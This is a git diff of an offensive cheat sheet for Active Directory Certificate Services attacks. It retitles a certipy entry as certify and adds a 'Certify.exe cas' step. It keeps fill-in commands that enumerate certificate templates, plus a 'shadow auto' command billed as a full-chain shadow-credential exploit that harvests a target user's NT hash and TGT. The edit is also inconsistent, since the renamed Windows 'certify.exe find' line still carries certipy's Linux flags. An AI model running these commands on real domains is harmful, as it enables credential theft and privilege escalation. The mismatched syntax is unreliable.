@@ -1,11 +1,16 @@
-# certipy
+# certify
 
 % adcs, certificate, pki, windows, Active directory, template, shadow credential
-#plateform/linux #target/remote #cat/AD/RECON
+#plateform/windows #target/remote #cat/AD/RECON
 
-## enum -  list enabled certificate templates 
+
+## enum - Ca
+```powershell
+Certify.exe cas
 ```
-certipy find -enabled  -hide-admins -u <user>@<domain_fqdn> -p '<password>' -dc-ip <dc_ip> [-stdout]
+## enum - list enabled certificate templates 
+```
+certify.exe find -enabled  -hide-admins -u <user>@<domain_fqdn> -p '<password>' -dc-ip <dc_ip> [-stdout]
 ```
 
 ## enum - list enabled certificate templates (socks)
@@ -139,7 +144,7 @@ certipy account create -u <user>@<domain_fqdn> -p '<password>' -dc-ip <dc_ip> -n
 
 
 ## shadow - get NT Hash using Shadow Credential
-#plateform/linux #target/remote #cat/ATTACK/AD/DACL-ABUSE/ShadowCredentials
+#plateform/linux #target/remote #cat/ATTACK
 Full Chain exploit of Shadow Credential: Create a Key Credential, Authenticate to get NT hash and TGT, and remove the Key Credential
 ```
 certipy shadow auto -u <user>@<domain_fqdn> -p '<password>' -account <targeted-user>  -dc-ip <dc_ip> -ns <dc_ip> -dns-tcp 
